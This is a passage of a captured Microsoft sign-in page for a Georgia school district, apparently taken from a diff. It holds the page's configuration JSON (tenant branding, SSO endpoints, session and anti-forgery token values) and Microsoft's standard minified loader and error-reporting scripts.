https://login.microsoftonline.com/69cbf852-5103-4521-a4fc-0ca208202372/resume?ctx=rQQIARAAjVJBa9NgGE7XdW5zm9WTR5FdnGZJviRtk1K0o7brlu-rsUm75CJfviRL02YtTbql9Q948OBRJnrw4EE8iMeBIIIgO03wIOJh4G0H8Th3EIM_QOR9Xnh54XkeeN53npJXvCgahDLDkJ6z6wxXST9g-ngUeUyIgx4TOBG2cYRX46A3vDSfPfh9X7_5cfPWq2fn3z7OZM9eppb_LYDD0BlG71PX7-UtAThcgRNIIU9cADhsCRiwwJFwwbULtkAECfCOneOOUqmvU5lmQgdnU-JouCP3cdgJ5R0cOKEcEblZhorMrXJ_Nx2bdvvDAEfyaCccOKTjdhx7P_0phdr1Mays9ZBmembb2IO1-h6slGMITA9OunER1SBIKjaAAaCPugbQBRggz2jDUhGv32XJOswpY8m3ai1gbtVHBpAiBfRGCqhyds1zDVANrdqGZ4CwVEQanKCg1TW0LoA1KBrB7T2YtOGveY2KLkJfFaCmg4ami40aChpaKzA120MVIhr-9tjUiJjwYqSpvBGoLJqQuFEulYqJa9dUk-FNejknEcstiIAWOZanBRFwNBZcQrMkibKQpMnnwUF6mWUB5-SJRBOOOLTEsgU6BwhL2wLmeZcQkePZo-mFk-kFNi3Pzs5nqcvUFep0OvU8kxz5y_e58PO1FeXJr6mrC8wSdZhhVHFroFaRktuOfV2yTGVkqe3WoLmOKl5U7t6p6v7mQGv6Zatc4mXu0czi4Qz1cyb14By1f446mPuvL3m3SJ0uPfz24cXh0-Mf6ycXbih539st52A7rI7R7vbI3Biodmeim2HAOWOCcpUgVl3EM_V-6XWWOk5wkfoD0","iPawnIcon":0,"iPollingInterval":1,"sPOST_Username":"E000000@muscogee.k12.ga.us","sFT":"AQABIQEAAABVrSpeuWamRam2jAF1XRQEgjXbKJqHscZh-z497Hw4nQZneKSwJngVaP8F7nBpzfiWW_lU4egP7VmoUJNKeO6T-4uW_eP5siFU4d962CXzg1hv7EAW5DdxZWDzmpN-itMpPfBuZ2BnnYr9j0yUFXuEEiVkkFMCM_4tw2BqEoIHPW1HxBQrrguPp5ZXb8Q_pf8ns-MHf9maiMVFlMItQBJHyqwIwN7cfgx4hJCswsdMpTEtdgbL72y91uW2ROSxivvl2sYA7DAdyUhJpz9b5s-z32IgZd_s0L9YmMsEv5xUOO8l_w0FB5pXn2N2r22UWmTQ8vYSx2S-yysRf0xfCN1dvzNfzG3Zbg6FOyvc5cxMmbg5sgSJmuYgWv_zAMj1FlZptRtJ7URgkSilvuVX1h0CqpG1z-oDfYou8tTtHSUQb1mUGbsnhaAwjMIUf3dnDZL7ah5iA-N_gkPB-PYZ3NssGBeBH_s9dHFkkeAGxC0IYFX7gY015xDSu0fBfb9CCMPUghGBnXBYpzHklrf56ruAmGiGzGo5dQ9-p5rms8vGajNDskyTNEYVc-0LN9zHeL1lT7xB8qxBSe1cE-vHFxlJReMJOUxGrSo8_5ExMAAgl0xeui5NG33bvzfRWcNFVfVJgTiL-IUVaD8IhpxeuNJ_hG98NoY3Ang0vBGwOeBCTSAA","sFTName":"flowToken","sFTCookieName":"ESTSWCTXFLOWTOKEN","sSessionIdentifierName":"code","sCtx":"rQQIARAAjVJBa9NgGE7XdW5zm9WTR5FdnGZJviRtk1K0o7brlu-rsUm75CJfviRL02YtTbql9Q948OBRJnrw4EE8iMeBIIIgO03wIOJh4G0H8Th3EIM_QOR9Xnh54XkeeN53npJXvCgahDLDkJ6z6wxXST9g-ngUeUyIgx4TOBG2cYRX46A3vDSfPfh9X7_5cfPWq2fn3z7OZM9eppb_LYDD0BlG71PX7-UtAThcgRNIIU9cADhsCRiwwJFwwbULtkAECfCOneOOUqmvU5lmQgdnU-JouCP3cdgJ5R0cOKEcEblZhorMrXJ_Nx2bdvvDAEfyaCccOKTjdhx7P_0phdr1Mays9ZBmembb2IO1-h6slGMITA9OunER1SBIKjaAAaCPugbQBRggz2jDUhGv32XJOswpY8m3ai1gbtVHBpAiBfRGCqhyds1zDVANrdqGZ4CwVEQanKCg1TW0LoA1KBrB7T2YtOGveY2KLkJfFaCmg4ami40aChpaKzA120MVIhr-9tjUiJjwYqSpvBGoLJqQuFEulYqJa9dUk-FNejknEcstiIAWOZanBRFwNBZcQrMkibKQpMnnwUF6mWUB5-SJRBOOOLTEsgU6BwhL2wLmeZcQkePZo-mFk-kFNi3Pzs5nqcvUFep0OvU8kxz5y_e58PO1FeXJr6mrC8wSdZhhVHFroFaRktuOfV2yTGVkqe3WoLmOKl5U7t6p6v7mQGv6Zatc4mXu0czi4Qz1cyb14By1f446mPuvL3m3SJ0uPfz24cXh0-Mf6ycXbih539st52A7rI7R7vbI3Biodmeim2HAOWOCcpUgVl3EM_V-6XWWOk5wkfoD0","iProductIcon":-1,"fEnableOneDSClientTelemetry":true,"staticTenantBranding":[{"Locale":0,"BannerLogo":"https://aadcdn.msauthimages.net/dbd5a2dd-e4kgm8e6gwdg2vizfydams7z-ujwyvruz8uixy2xwx8/logintenantbranding/0/bannerlogo?ts=637534861683509065","Illustration":"https://aadcdn.msauthimages.net/dbd5a2dd-e4kgm8e6gwdg2vizfydams7z-ujwyvruz8uixy2xwx8/logintenantbranding/0/illustration?ts=637533979620581079","BoilerPlateText":"<p><strong>Staff will use their E0 or C0 number followed by</strong>\n@muscogee.k12.ga.us to log in. Examples:\n<strong>E000000@muscogee.k12.ga.us\nC000000@muscogee.k12.ga.us</strong></p>\n<p><strong>Students will use their GTID followed by</strong>\n@mcsdgas.com to login.\nExample: <strong>123456789@mcsdgas.com</strong></p>\n<p><em>The password is your normal MCSD network/email/computer password.</em></p>\n","KeepMeSignedInDisabled":false,"UseTransparentLightBox":false}],"oAppCobranding":{},"iBackgroundImage":2,"arrSessions":[{"id":"0021e7c9-c1ce-9008-62c0-d4a33fcc5130","name":"E000000@muscogee.k12.ga.us","displayName":"E000000@muscogee.k12.ga.us","fullName":"Put Name In N","idp":0,"isSignedIn":true,"idpAuthUrl":""}],"fApplicationInsightsEnabled":false,"iApplicationInsightsEnabledPercentage":0,"urlSetDebugMode":"https://login.microsoftonline.com/common/debugmode","fEnableCssAnimation":true,"fAllowGrayOutLightBox":true,"fUseMsaSessionState":true,"fIsRemoteNGCSupported":true,"desktopSsoConfig":{"isEdgeAnaheimAllowed":true,"iwaEndpointUrlFormat":"https://autologon.microsoftazuread-sso.com/{0}/winauth/sso?client-request-id=557bfeba-c83f-404b-ac9e-0bbd980510fa","iwaSsoProbeUrlFormat":"https://autologon.microsoftazuread-sso.com/{0}/winauth/ssoprobe?client-request-id=557bfeba-c83f-404b-ac9e-0bbd980510fa","iwaIFrameUrlFormat":"https://autologon.microsoftazuread-sso.com/{0}/winauth/iframe?client-request-id=557bfeba-c83f-404b-ac9e-0bbd980510fa\u0026isAdalRequest=False","iwaRequestTimeoutInMs":10000,"startDesktopSsoOnPageLoad":false,"progressAnimationTimeout":10000,"isEdgeAllowed":false,"minDssoEdgeVersion":"17","isSafariAllowed":true,"redirectUri":"https://clever.com/oauth/saml/assert?error=interaction_required\u0026error_description=Seamless+single+sign+on+failed+for+the+user.+This+can+happen+if+the+user+is+unable+to+access+on+premises+AD+or+intranet+zone+is+not+configured+correctly+Trace+ID%3a+7309e3d8-29d4-4c2a-9bf9-02220c2f0e00+Correlation+ID%3a+557bfeba-c83f-404b-ac9e-0bbd980510fa+Timestamp%3a+2025-04-21+15%3a53%3a22Z\u0026state=NWIyMDBlNTZhZWYwMGIwMDAxM2ZhMzkx%3bNGM2M2MxY2Y2MjNkY2U4MmNhYWM%3d%3baHR0cHM6Ly9jbGV2ZXIuY29tL2luL2F1dGhfY2FsbGJhY2s%3d%3bNTMzNmVkYTk2MGM5YmEwMmEwYjBhODU5MjQ4MTU2OTU5OGNmOTVmZTdhNDc5YjgyZTc5MGMxNTQ3YmQ0NzcxOA%3d%3d%3bY29kZQ%3d%3d%3b","isIEAllowedForSsoProbe":true,"edgeRedirectUri":"https://autologon.microsoftazuread-sso.com/69cbf852-5103-4521-a4fc-0ca208202372/winauth/sso/edgeredirect?client-request-id=557bfeba-c83f-404b-ac9e-0bbd980510fa\u0026origin=login.microsoftonline.com\u0026is_redirected=1","isFlowTokenPassedInEdge":true},"urlLogin":"https://login.microsoftonline.com/69cbf852-5103-4521-a4fc-0ca208202372/reprocess?ctx=rQQIARAAjVJBa9NgGE7XdW5zm9WTR5FdnGZJviRtk1K0o7brlu-rsUm75CJfviRL02YtTbql9Q948OBRJnrw4EE8iMeBIIIgO03wIOJh4G0H8Th3EIM_QOR9Xnh54XkeeN53npJXvCgahDLDkJ6z6wxXST9g-ngUeUyIgx4TOBG2cYRX46A3vDSfPfh9X7_5cfPWq2fn3z7OZM9eppb_LYDD0BlG71PX7-UtAThcgRNIIU9cADhsCRiwwJFwwbULtkAECfCOneOOUqmvU5lmQgdnU-JouCP3cdgJ5R0cOKEcEblZhorMrXJ_Nx2bdvvDAEfyaCccOKTjdhx7P_0phdr1Mays9ZBmembb2IO1-h6slGMITA9OunER1SBIKjaAAaCPugbQBRggz2jDUhGv32XJOswpY8m3ai1gbtVHBpAiBfRGCqhyds1zDVANrdqGZ4CwVEQanKCg1TW0LoA1KBrB7T2YtOGveY2KLkJfFaCmg4ami40aChpaKzA120MVIhr-9tjUiJjwYqSpvBGoLJqQuFEulYqJa9dUk-FNejknEcstiIAWOZanBRFwNBZcQrMkibKQpMnnwUF6mWUB5-SJRBOOOLTEsgU6BwhL2wLmeZcQkePZo-mFk-kFNi3Pzs5nqcvUFep0OvU8kxz5y_e58PO1FeXJr6mrC8wSdZhhVHFroFaRktuOfV2yTGVkqe3WoLmOKl5U7t6p6v7mQGv6Zatc4mXu0czi4Qz1cyb14By1f446mPuvL3m3SJ0uPfz24cXh0-Mf6ycXbih539st52A7rI7R7vbI3Biodmeim2HAOWOCcpUgVl3EM_V-6XWWOk5wkfoD0","urlDssoStatus":"https://login.microsoftonline.com/common/instrumentation/dssostatus","iSessionPullType":2,"fUseSameSite":true,"iAllowedIdentities":1,"uiflavor":1001,"urlFidoHelp":"https://go.microsoft.com/fwlink/?linkid=2013738","urlFidoLogin":"https://login.microsoft.com/69cbf852-5103-4521-a4fc-0ca208202372/fido/get?uiflavor=Web","fIsFidoSupported":true,"fLoadStringCustomizationPromises":true,"fOfflineAccountVisible":false,"fEnableUserStateFix":true,"fAccessPassSupported":true,"fShowAccessPassPeek":true,"fUpdateSessionPollingLogic":true,"fEnableShowPickerCredObservable":true,"fFetchSessionsSkipDsso":true,"fIsCiamUserFlowUxNewLogicEnabled":true,"fUseNonMicrosoftDefaultBrandingForCiam":true,"sCompanyDisplayName":"Muscogee County School District","fRemoveCustomCss":true,"fFixUICrashForApiRequestHandler":true,"fShowUpdatedKoreanPrivacyFooter":true,"fUsePostCssHotfix":true,"fUseHighContrastDetectionMode":true,"fFixUserFlowBranding":true,"fIsQrCodePinSupported":true,"fEnablePasskeyNullFix":true,"fEnableRefreshCookiesFix":true,"urlAcmaServerPath":"https://login.microsoftonline.com","sTenantId":"69cbf852-5103-4521-a4fc-0ca208202372","sMkt":"en-US","scid":1015,"hpgact":1900,"hpgid":1104,"pgid":"ConvergedSignIn","apiCanary":"PAQABDgEAAABVrSpeuWamRam2jAF1XRQEqabBUTBtuz6_LROGVKXHWmgzK35jT1mYjt3dzK1AcJx88N8J7IOYOYHfOccVdoGvtjZJsBFCANVgW_RTai84jK-OAaNMmQRX7tklK0pjgL-cXR0485vKu67kevFW9SJAa-WZK5tvJHKyW8tUOF81ihPBKB7GvZcK8lymMmQ-DdbQgriVK3azsiGr_R_0G7dmL6PPBqUTulZ459ExBtJnpCAA","canary":"Q5XpQFNL6gxjU9bZLubQWVpSHNDhtAkPFUjKpTSjAbA=3:1:CANARY:L7jhvA6MWsFyNvguZJpQdizUZsm1eycN6DmxQfN3/Io=","sCanaryTokenName":"canary","fSkipRenderingNewCanaryToken":false,"fEnableNewCsrfProtection":true,"correlationId":"557bfeba-c83f-404b-ac9e-0bbd980510fa","sessionId":"7309e3d8-29d4-4c2a-9bf9-02220c2f0e00","sRingId":"R4","locale":{"mkt":"en-US","lcid":1033},"slMaxRetry":2,"slReportFailure":true,"strings":{"desktopsso":{"authenticatingmessage":"Trying to sign you in"}},"enums":{"ClientMetricsModes":{"None":0,"SubmitOnPost":1,"SubmitOnRedirect":2,"InstrumentPlt":4}},"urls":{"instr":{"pageload":"https://login.microsoftonline.com/common/instrumentation/reportpageload","dssostatus":"https://login.microsoftonline.com/common/instrumentation/dssostatus"}},"browser":{"ltr":1,"Chrome":1,"_Win":1,"_M135":1,"_D0":1,"Full":1,"Win81":1,"RE_WebKit":1,"b":{"name":"Chrome","major":135,"minor":0},"os":{"name":"Windows","version":"10.0"},"V":"135.0"},"watson":{"url":"/common/handlers/watson","bundle":"https://aadcdn.msauth.net/ests/2.1/content/cdnbundles/watson.min_q5ptmu8aniymd4ftuqdkda2.js","sbundle":"https://aadcdn.msauth.net/ests/2.1/content/cdnbundles/watsonsupportwithjquery.3.5.min_dc940oomzau4rsu8qesnvg2.js","fbundle":"https://aadcdn.msauth.net/ests/2.1/content/cdnbundles/frameworksupport.min_oadrnc13magb009k4d20lg2.js","resetErrorPeriod":5,"maxCorsErrors":-1,"maxInjectErrors":5,"maxErrors":10,"maxTotalErrors":3,"expSrcs":["https://login.microsoftonline.com","https://aadcdn.msauth.net/","https://aadcdn.msftauth.net/",".login.microsoftonline.com"],"envErrorRedirect":true,"envErrorUrl":"/common/handlers/enverror"},"loader":{"cdnRoots":["https://aadcdn.msauth.net/","https://aadcdn.msftauth.net/"],"logByThrowing":true,"tenantBrandingCdnRoots":["aadcdn.msauthimages.net","aadcdn.msftauthimages.net"]},"serverDetails":{"slc":"ProdSlices","dc":"SCUS","ri":"SN3XXXX","ver":{"v":[2,1,20540,5]},"rt":"2025-04-21T15:53:22","et":74},"clientEvents":{"enabled":true,"telemetryEnabled":true,"useOneDSEventApi":true,"flush":60000,"autoPost":true,"autoPostDelay":1000,"minEvents":1,"maxEvents":1,"pltDelay":500,"appInsightsConfig":{"instrumentationKey":"69adc3c768bd4dc08c19416121249fcc-66f1668a-797b-4249-95e3-6c6651768c28-7293","webAnalyticsConfiguration":{"autoCapture":{"jsError":true}}},"defaultEventName":"IDUX_ESTSClientTelemetryEvent_WebWatson","serviceID":3,"endpointUrl":""},"fApplyAsciiRegexOnInput":true,"country":"US","fBreakBrandingSigninString":true,"bsso":{"states":{"START":"start","INPROGRESS":"in-progress","END":"end","END_SSO":"end-sso","END_USERS":"end-users"},"nonce":"AwABEgEAAAADAOz_BQD0_9q0VgCPjcfADYgpl9AUc784yE8aOP3f6PwqUnZSLp58gycoYSftaNnStzA7al3mnSUw7zoG4ad-vQhGEgchGvEgAA","overallTimeoutMs":4000,"telemetry":{"type":"ChromeSsoTelemetry","nonce":"AwABDwEAAAADAOz_BQD0_wJ1hVo5BrFFrOAZntV4cqYHzd0g2gHSiW52texhOveRAfeZZ0rh2UiD2TP1f0XVMHK_2jYhJmF9MTtM93RSS3LpJXUWPeg_2aK-oXejaHdFIAA","reportStates":[]},"redirectEndStates":["end"],"cookieNames":{"aadSso":"AADSSO","winSso":"ESTSSSO","ssoTiles":"ESTSSSOTILES","ssoPulled":"SSOCOOKIEPULLED","userList":"ESTSUSERLIST"},"type":"chrome","reason":"Pull suppressed due to UI error in rendering context"},"urlNoCookies":"https://login.microsoftonline.com/cookiesdisabled","fTrimChromeBssoUrl":true,"inlineMode":5,"fShowCopyDebugDetailsLink":true,"fTenantBrandingCdnAddEventHandlers":true,"fAddTryCatchForIFrameRedirects":true};
-//]]></script> 
-<script type="text/javascript" nonce='5ayvToqLbbGVRqjTMtK-IA'>//<![CDATA[
-!function(){var e=window,r=e.$Debug=e.$Debug||{},t=e.$Config||{};if(!r.appendLog){var n=[],o=0;r.appendLog=function(e){var r=t.maxDebugLog||25,i=(new Date).toUTCString()+":"+e;n.push(o+":"+i),n.length>r&&n.shift(),o++},r.getLogs=function(){return n}}}(),function(){function e(e,r){function t(i){var a=e[i];if(i<n-1){return void(o.r[a]?t(i+1):o.when(a,function(){t(i+1)}))}r(a)}var n=e.length;t(0)}function r(e,r,i){function a(){var e=!!s.method,o=e?s.method:i[0],a=s.extraArgs||[],u=n.$WebWatson;try{
-var c=t(i,!e);if(a&&a.length>0){for(var d=a.length,l=0;l<d;l++){c.push(a[l])}}o.apply(r,c)}catch(e){return void(u&&u.submitFromException&&u.submitFromException(e))}}var s=o.r&&o.r[e];return r=r||this,s&&(s.skipTimeout?a():n.setTimeout(a,0)),s}function t(e,r){return Array.prototype.slice.call(e,r?1:0)}var n=window;n.$Do||(n.$Do={"q":[],"r":[],"removeItems":[],"lock":0,"o":[]});var o=n.$Do;o.when=function(t,n){function i(e){r(e,a,s)||o.q.push({"id":e,"c":a,"a":s})}var a=0,s=[],u=1;"function"==typeof n||(a=n,
-u=2);for(var c=u;c<arguments.length;c++){s.push(arguments[c])}t instanceof Array?e(t,i):i(t)},o.register=function(e,t,n){if(!o.r[e]){o.o.push(e);var i={};if(t&&(i.method=t),n&&(i.skipTimeout=n),arguments&&arguments.length>3){i.extraArgs=[];for(var a=3;a<arguments.length;a++){i.extraArgs.push(arguments[a])}}o.r[e]=i,o.lock++;try{for(var s=0;s<o.q.length;s++){var u=o.q[s];u.id==e&&r(e,u.c,u.a)&&o.removeItems.push(u)}}catch(e){throw e}finally{if(0===--o.lock){for(var c=0;c<o.removeItems.length;c++){
-for(var d=o.removeItems[c],l=0;l<o.q.length;l++){if(o.q[l]===d){o.q.splice(l,1);break}}}o.removeItems=[]}}}},o.unregister=function(e){o.r[e]&&delete o.r[e]}}(),function(e,r){function t(){if(!a){if(!r.body){return void setTimeout(t)}a=!0,e.$Do.register("doc.ready",0,!0)}}function n(){if(!s){if(!r.body){return void setTimeout(n)}t(),s=!0,e.$Do.register("doc.load",0,!0),i()}}function o(e){(r.addEventListener||"load"===e.type||"complete"===r.readyState)&&t()}function i(){
-r.addEventListener?(r.removeEventListener("DOMContentLoaded",o,!1),e.removeEventListener("load",n,!1)):r.attachEvent&&(r.detachEvent("onreadystatechange",o),e.detachEvent("onload",n))}var a=!1,s=!1;if("complete"===r.readyState){return void setTimeout(n)}!function(){r.addEventListener?(r.addEventListener("DOMContentLoaded",o,!1),e.addEventListener("load",n,!1)):r.attachEvent&&(r.attachEvent("onreadystatechange",o),e.attachEvent("onload",n))}()}(window,document),function(){function e(){
-return f.$Config||f.ServerData||{}}function r(e,r){var t=f.$Debug;t&&t.appendLog&&(r&&(e+=" '"+(r.src||r.href||"")+"'",e+=", id:"+(r.id||""),e+=", async:"+(r.async||""),e+=", defer:"+(r.defer||"")),t.appendLog(e))}function t(){var e=f.$B;if(void 0===d){if(e){d=e.IE}else{var r=f.navigator.userAgent;d=-1!==r.indexOf("MSIE ")||-1!==r.indexOf("Trident/")}}return d}function n(){var e=f.$B;if(void 0===l){if(e){l=e.RE_Edge}else{var r=f.navigator.userAgent;l=-1!==r.indexOf("Edge")}}return l}function o(e){
-var r=e.indexOf("?"),t=r>-1?r:e.length,n=e.lastIndexOf(".",t);return e.substring(n,n+v.length).toLowerCase()===v}function i(){var r=e();return(r.loader||{}).slReportFailure||r.slReportFailure||!1}function a(){return(e().loader||{}).redirectToErrorPageOnLoadFailure||!1}function s(){return(e().loader||{}).logByThrowing||!1}function u(e){if(!t()&&!n()){return!1}var r=e.src||e.href||"";if(!r){return!0}if(o(r)){var i,a,s;try{i=e.sheet,a=i&&i.cssRules,s=!1}catch(e){s=!0}if(i&&!a&&s){return!0}
-if(i&&a&&0===a.length){return!0}}return!1}function c(){function t(e){g.getElementsByTagName("head")[0].appendChild(e)}function n(e,r,t,n){var u=null;return u=o(e)?i(e):"script"===n.toLowerCase()?a(e):s(e,n),r&&(u.id=r),"function"==typeof u.setAttribute&&(u.setAttribute("crossorigin","anonymous"),t&&"string"==typeof t&&u.setAttribute("integrity",t)),u}function i(e){var r=g.createElement("link");return r.rel="stylesheet",r.type="text/css",r.href=e,r}function a(e){
-var r=g.createElement("script"),t=g.querySelector("script[nonce]");if(r.type="text/javascript",r.src=e,r.defer=!1,r.async=!1,t){var n=t.nonce||t.getAttribute("nonce");r.setAttribute("nonce",n)}return r}function s(e,r){var t=g.createElement(r);return t.src=e,t}function d(e,r){if(e&&e.length>0&&r){for(var t=0;t<e.length;t++){if(-1!==r.indexOf(e[t])){return!0}}}return!1}function l(r){if(e().fTenantBrandingCdnAddEventHandlers){var t=d(E,r)?E:b;if(!(t&&t.length>1)){return r}for(var n=0;n<t.length;n++){
-if(-1!==r.indexOf(t[n])){var o=t[n+1<t.length?n+1:0],i=r.substring(t[n].length);return"https://"!==t[n].substring(0,"https://".length)&&(o="https://"+o,i=i.substring("https://".length)),o+i}}return r}if(!(b&&b.length>1)){return r}for(var a=0;a<b.length;a++){if(0===r.indexOf(b[a])){return b[a+1<b.length?a+1:0]+r.substring(b[a].length)}}return r}function f(e,t,n,o){if(r("[$Loader]: "+(L.failMessage||"Failed"),o),w[e].retry<y){return w[e].retry++,h(e,t,n),void c._ReportFailure(w[e].retry,w[e].srcPath)}n&&n()}
-function v(e,t,n,o){if(u(o)){return f(e,t,n,o)}r("[$Loader]: "+(L.successMessage||"Loaded"),o),h(e+1,t,n);var i=w[e].onSuccess;"function"==typeof i&&i(w[e].srcPath)}function h(e,o,i){if(e<w.length){var a=w[e];if(!a||!a.srcPath){return void h(e+1,o,i)}a.retry>0&&(a.srcPath=l(a.srcPath),a.origId||(a.origId=a.id),a.id=a.origId+"_Retry_"+a.retry);var s=n(a.srcPath,a.id,a.integrity,a.tagName);s.onload=function(){v(e,o,i,s)},s.onerror=function(){f(e,o,i,s)},s.onreadystatechange=function(){
-"loaded"===s.readyState?setTimeout(function(){v(e,o,i,s)},500):"complete"===s.readyState&&v(e,o,i,s)},t(s),r("[$Loader]: Loading '"+(a.srcPath||"")+"', id:"+(a.id||""))}else{o&&o()}}var p=e(),y=p.slMaxRetry||2,m=p.loader||{},b=m.cdnRoots||[],E=m.tenantBrandingCdnRoots||[],L=this,w=[];L.retryOnError=!0,L.successMessage="Loaded",L.failMessage="Error",L.Add=function(e,r,t,n,o,i){e&&w.push({"srcPath":e,"id":r,"retry":n||0,"integrity":t,"tagName":o||"script","onSuccess":i})},L.AddForReload=function(e,r){
-var t=e.src||e.href||"";L.Add(t,"AddForReload",e.integrity,1,e.tagName,r)},L.AddIf=function(e,r,t){e&&L.Add(r,t)},L.Load=function(e,r){h(0,e,r)}}var d,l,f=window,g=f.document,v=".css";c.On=function(e,r,t){if(!e){throw"The target element must be provided and cannot be null."}r?c.OnError(e,t):c.OnSuccess(e,t)},c.OnSuccess=function(e,t){if(!e){throw"The target element must be provided and cannot be null."}if(u(e)){return c.OnError(e,t)}var n=e.src||e.href||"",o=i(),s=a();r("[$Loader]: Loaded",e);var d=new c
-;d.failMessage="Reload Failed",d.successMessage="Reload Success",d.Load(null,function(){if(o){throw"Unexpected state. ResourceLoader.Load() failed despite initial load success. ['"+n+"']"}s&&(document.location.href="/error.aspx?err=504")})},c.OnError=function(e,t){var n=e.src||e.href||"",o=i(),s=a();if(!e){throw"The target element must be provided and cannot be null."}r("[$Loader]: Failed",e);var u=new c;u.failMessage="Reload Failed",u.successMessage="Reload Success",u.AddForReload(e,t),
-u.Load(null,function(){if(o){throw"Failed to load external resource ['"+n+"']"}s&&(document.location.href="/error.aspx?err=504")}),c._ReportFailure(0,n)},c._ReportFailure=function(e,r){if(s()&&!t()){throw"[Retry "+e+"] Failed to load external resource ['"+r+"'], reloading from fallback CDN endpoint"}},f.$Loader=c}(),function(){function e(){if(!E){var e=new h.$Loader;e.AddIf(!h.jQuery,y.sbundle,"WebWatson_DemandSupport"),y.sbundle=null,delete y.sbundle,e.AddIf(!h.$Api,y.fbundle,"WebWatson_DemandFramework"),
-y.fbundle=null,delete y.fbundle,e.Add(y.bundle,"WebWatson_DemandLoaded"),e.Load(r,t),E=!0}}function r(){if(h.$WebWatson){if(h.$WebWatson.isProxy){return void t()}m.when("$WebWatson.full",function(){for(;b.length>0;){var e=b.shift();e&&h.$WebWatson[e.cmdName].apply(h.$WebWatson,e.args)}})}}function t(){if(!h.$WebWatson||h.$WebWatson.isProxy){if(!L&&JSON){try{var e=new XMLHttpRequest;e.open("POST",y.url),e.setRequestHeader("Accept","application/json"),
-e.setRequestHeader("Content-Type","application/json; charset=UTF-8"),e.setRequestHeader("canary",p.apiCanary),e.setRequestHeader("client-request-id",p.correlationId),e.setRequestHeader("hpgid",p.hpgid||0),e.setRequestHeader("hpgact",p.hpgact||0);for(var r=-1,t=0;t<b.length;t++){if("submit"===b[t].cmdName){r=t;break}}var o=b[r]?b[r].args||[]:[],i={"sr":y.sr,"ec":"Failed to load external resource [Core Watson files]","wec":55,"idx":1,"pn":p.pgid||"","sc":p.scid||0,"hpg":p.hpgid||0,
-"msg":"Failed to load external resource [Core Watson files]","url":o[1]||"","ln":0,"ad":0,"an":!1,"cs":"","sd":p.serverDetails,"ls":null,"diag":v(y)};e.send(JSON.stringify(i))}catch(e){}L=!0}y.loadErrorUrl&&window.location.assign(y.loadErrorUrl)}n()}function n(){b=[],h.$WebWatson=null}function o(r){return function(){var t=arguments;b.push({"cmdName":r,"args":t}),e()}}function i(){var e=["foundException","resetException","submit"],r=this;r.isProxy=!0;for(var t=e.length,n=0;n<t;n++){var i=e[n];i&&(r[i]=o(i))}
-}function a(e,r,t,n,o,i,a){var s=h.event;return i||(i=l(o||s,a?a+2:2)),h.$Debug&&h.$Debug.appendLog&&h.$Debug.appendLog("[WebWatson]:"+(e||"")+" in "+(r||"")+" @ "+(t||"??")),$.submit(e,r,t,n,o||s,i,a)}function s(e,r){return{"signature":e,"args":r,"toString":function(){return this.signature}}}function u(e){for(var r=[],t=e.split("\n"),n=0;n<t.length;n++){r.push(s(t[n],[]))}return r}function c(e){for(var r=[],t=e.split("\n"),n=0;n<t.length;n++){var o=s(t[n],[]);t[n+1]&&(o.signature+="@"+t[n+1],n++),r.push(o)
-}return r}function d(e){if(!e){return null}try{if(e.stack){return u(e.stack)}if(e.error){if(e.error.stack){return u(e.error.stack)}}else if(window.opera&&e.message){return c(e.message)}}catch(e){}return null}function l(e,r){var t=[];try{for(var n=arguments.callee;r>0;){n=n?n.caller:n,r--}for(var o=0;n&&o<w;){var i="InvalidMethod()";try{i=n.toString()}catch(e){}var a=[],u=n.args||n.arguments;if(u){for(var c=0;c<u.length;c++){a[c]=u[c]}}t.push(s(i,a)),n=n.caller,o++}}catch(e){t.push(s(e.toString(),[]))}
-var l=d(e);return l&&(t.push(s("--- Error Event Stack -----------------",[])),t=t.concat(l)),t}function f(e){if(e){try{var r=/function (.{1,})\(/,t=r.exec(e.constructor.toString());return t&&t.length>1?t[1]:""}catch(e){}}return""}function g(e){if(e){try{if("string"!=typeof e&&JSON&&JSON.stringify){var r=f(e),t=JSON.stringify(e);return t&&"{}"!==t||(e.error&&(e=e.error,r=f(e)),(t=JSON.stringify(e))&&"{}"!==t||(t=e.toString())),r+":"+t}}catch(e){}}return""+(e||"")}function v(e){var r=[];try{
-if(jQuery?(r.push("jQuery v:"+jQuery().jquery),jQuery.easing?r.push("jQuery.easing:"+JSON.stringify(jQuery.easing)):r.push("jQuery.easing is not defined")):r.push("jQuery is not defined"),e&&e.expectedVersion&&r.push("Expected jQuery v:"+e.expectedVersion),m){var t,n="";for(t=0;t<m.o.length;t++){n+=m.o[t]+";"}for(r.push("$Do.o["+n+"]"),n="",t=0;t<m.q.length;t++){n+=m.q[t].id+";"}r.push("$Do.q["+n+"]")}if(h.$Debug&&h.$Debug.getLogs){var o=h.$Debug.getLogs();o&&o.length>0&&(r=r.concat(o))}if(b){
-for(var i=0;i<b.length;i++){var a=b[i];if(a&&"submit"===a.cmdName){try{if(JSON&&JSON.stringify){var s=JSON.stringify(a);s&&r.push(s)}}catch(e){r.push(g(e))}}}}}catch(e){r.push(g(e))}return r}var h=window,p=h.$Config||{},y=p.watson,m=h.$Do;if(!h.$WebWatson&&y){var b=[],E=!1,L=!1,w=10,$=h.$WebWatson=new i;$.CB={},$._orgErrorHandler=h.onerror,h.onerror=a,$.errorHooked=!0,m.when("jQuery.version",function(e){y.expectedVersion=e}),m.register("$WebWatson")}}(),function(){function e(e,r){
-for(var t=r.split("."),n=t.length,o=0;o<n&&null!==e&&void 0!==e;){e=e[t[o++]]}return e}function r(r){var t=null;return null===u&&(u=e(i,"Constants")),null!==u&&r&&(t=e(u,r)),null===t||void 0===t?"":t.toString()}function t(t){var n=null;return null===a&&(a=e(i,"$Config.strings")),null!==a&&t&&(n=e(a,t.toLowerCase())),null!==n&&void 0!==n||(n=r(t)),null===n||void 0===n?"":n.toString()}function n(e,r){var n=null;return e&&r&&r[e]&&(n=t("errors."+r[e])),n||(n=t("errors."+e)),n||(n=t("errors."+c)),n||(n=t(c)),n}
-function o(t){var n=null;return null===s&&(s=e(i,"$Config.urls")),null!==s&&t&&(n=e(s,t.toLowerCase())),null!==n&&void 0!==n||(n=r(t)),null===n||void 0===n?"":n.toString()}var i=window,a=null,s=null,u=null,c="GENERIC_ERROR";i.GetString=t,i.GetErrorString=n,i.GetUrl=o}(),function(){var e=window,r=e.$Config||{};e.$B=r.browser||{}}(),function(){function e(e,r,t){e&&e.addEventListener?e.addEventListener(r,t):e&&e.attachEvent&&e.attachEvent("on"+r,t)}function r(r,t){e(document.getElementById(r),"click",t)}
-function t(r,t){var n=document.getElementsByName(r);n&&n.length>0&&e(n[0],"click",t)}var n=window;n.AddListener=e,n.ClickEventListenerById=r,n.ClickEventListenerByName=t}();
-//]]></script> 
